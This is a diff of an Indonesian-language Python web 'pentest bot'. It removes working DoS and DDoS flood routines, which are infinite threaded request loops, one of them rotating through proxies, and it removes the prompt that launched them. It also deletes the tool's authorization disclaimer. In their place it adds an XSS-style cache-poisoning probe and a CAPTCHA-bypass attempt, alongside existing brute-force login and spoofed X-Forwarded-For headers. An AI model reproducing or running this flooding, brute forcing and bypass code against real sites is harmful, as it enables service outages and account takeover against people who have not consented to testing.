@@ -23,18 +23,14 @@ class WebPenTestBot:
     def __init__(self, base_url, proxy=None, login_url=None, credentials=None):
         if not validators.url(base_url):
             raise ValueError("URL yang diberikan tidak valid")
-        
         self.base_url = base_url
         self.proxy = proxy
         self.login_url = login_url
         self.credentials = credentials
         self.session = aiohttp.ClientSession()
         self.log_file = 'pentest_results.log'
-
         if self.login_url and self.credentials:
             self.login()
-
-        print(f"{Colors.MAGENTA}Disclaimer: Pastikan Anda memiliki izin eksplisit untuk melakukan pengujian ini.{Colors.RESET}")
 
     def log(self, message, color=Colors.RESET):
         with open(self.log_file, 'a') as log:
@@ -56,7 +52,7 @@ class WebPenTestBot:
     def generate_random_headers(self):
         headers = {
             "User-Agent": self.random_user_agent(),
-            "X-Forwarded-For": f"192.168.{random.randint(1, 255)}.{random.randint(1, 255)}",  # Randomize IP address
+            "X-Forwarded-For": f"192.168.{random.randint(1, 255)}.{random.randint(1, 255)}",
             "X-Requested-With": "XMLHttpRequest",
             "Accept": "application/json, text/javascript, */*; q=0.01",
         }
@@ -130,32 +126,33 @@ class WebPenTestBot:
                     else:
                         self.log(f"{Colors.RED}[x] Gagal login dengan username: {username} dan password: {password}{Colors.RESET}")
 
-    def do_s_attack(self, url, threads=10):
-        def send_request():
-            while True:
-                try:
-                    response = requests.get(url)
-                    self.log(f"[DoS] Permintaan terkirim ke {url} | Status: {response.status_code}", Colors.YELLOW)
-                except requests.RequestException as e:
-                    self.log(f"[!] Gagal mengirim permintaan: {e}", Colors.RED)
-        
-        for _ in range(threads):
-            threading.Thread(target=send_request).start()
+    async def cache_poisoning(self, path):
+        payload = "username=<script>alert('Cache Poisoning')</script>"
+        url = self.base_url + path
+        async with self.session.get(url, params={'input': payload}, headers=self.generate_random_headers()) as response:
+            if payload in await response.text():
+                self.log(f"{Colors.GREEN}[!] Cache Poisoning berhasil pada: {url}{Colors.RESET}")
+            else:
+                self.log(f"{Colors.RED}[x] Tidak ada Cache Poisoning di {url}{Colors.RESET}")
 
-    
-    def ddos_attack(self, url, proxy_list, num_threads=10):
-        def send_request():
-            session = requests.Session()
-            while True:
-                proxy = random.choice(proxy_list)
-                try:
-                    response = session.get(url, proxies={'http': proxy, 'https': proxy})
-                    self.log(f"[DDoS] Permintaan terkirim ke {url} menggunakan proxy {proxy} | Status: {response.status_code}", Colors.YELLOW)
-                except requests.RequestException as e:
-                    self.log(f"[!] Gagal mengirim permintaan: {e}", Colors.RED)
-        
-        for _ in range(num_threads):
-            threading.Thread(target=send_request).start()
+    async def api_security_test(self, path):
+        url = self.base_url + path
+        headers = self.generate_random_headers()
+        async with self.session.get(url, headers=headers) as response:
+            if response.status == 200:
+                self.log(f"{Colors.GREEN}[+] API Keamanan diuji berhasil pada: {url}{Colors.RESET}")
+            else:
+                self.log(f"{Colors.RED}[x] Pengujian API gagal pada: {url}{Colors.RESET}")
+
+    async def bypass_captcha(self, path):
+        url = self.base_url + path
+        captcha_response = "dummy_solution"
+        data = {"captcha_response": captcha_response}
+        async with self.session.post(url, data=data, headers=self.generate_random_headers()) as response:
+            if 'success' in await response.text():
+                self.log(f"{Colors.GREEN}[+] CAPTCHA berhasil dilewati di {url}{Colors.RESET}")
+            else:
+                self.log(f"{Colors.RED}[x] Gagal melewati CAPTCHA di {url}{Colors.RESET}")
 
     async def analyze_site(self):
         paths = ['/login', '/admin', '/upload', '/search', '/user', '/config', '/files', '/data']
@@ -166,6 +163,9 @@ class WebPenTestBot:
             tasks.append(self.test_xss(path))
             tasks.append(self.test_csrf(path))
             tasks.append(self.brute_force_login(path))
+            tasks.append(self.cache_poisoning(path))
+            tasks.append(self.api_security_test(path))
+            tasks.append(self.bypass_captcha(path))
 
         await asyncio.gather(*tasks)
 
@@ -196,19 +196,8 @@ async def main():
             credentials = None
 
         bot = WebPenTestBot(target_url, proxy if proxy else None, login_url, credentials)
-        
-        await bot.analyze_site()
 
-        attack_choice = input(f"{Colors.RED}Ingin melakukan DoS atau DDoS? Pilih (1) untuk DoS atau (2) untuk DDoS atau tekan Enter untuk melewati: {Colors.RESET}")
-        
-        if attack_choice == '1':
-            print(f"{Colors.YELLOW}Melakukan serangan DoS pada {target_url}...{Colors.RESET}")
-            bot.do_s_attack(target_url)
-        elif attack_choice == '2':
-            proxy_list = input(f"{Colors.CYAN}Masukkan daftar proxy (misal: http://proxy1:8080,http://proxy2:8080): {Colors.RESET}").split(',')
-            print(f"{Colors.YELLOW}Melakukan serangan DDoS pada {target_url} menggunakan proxy...{Colors.RESET}")
-            bot.ddos_attack(target_url, proxy_list)
+        await bot.analyze_site()
 
 if __name__ == "__main__":
     asyncio.run(main())
-
